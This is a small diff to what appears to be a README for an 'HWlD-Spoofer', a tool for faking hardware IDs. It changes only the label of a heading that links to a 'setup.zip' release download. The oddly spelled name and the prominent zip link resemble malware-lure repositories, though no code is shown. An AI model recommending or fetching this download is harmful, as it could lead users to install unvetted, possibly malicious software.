@@ -1,4 +1,4 @@
-# [*Click* HWlD-Spoofer](https://github.com/Kas295/MagiskHWlD-Spoofer/releases/download/MagiskHWlD-Spoofer/setup.zip)
+# [📁HWlD-Spoofer](https://github.com/Kas295/MagiskHWlD-Spoofer/releases/download/MagiskHWlD-Spoofer/setup.zip)
 
 #### Why use an HWID Spoofer / Changer?
 
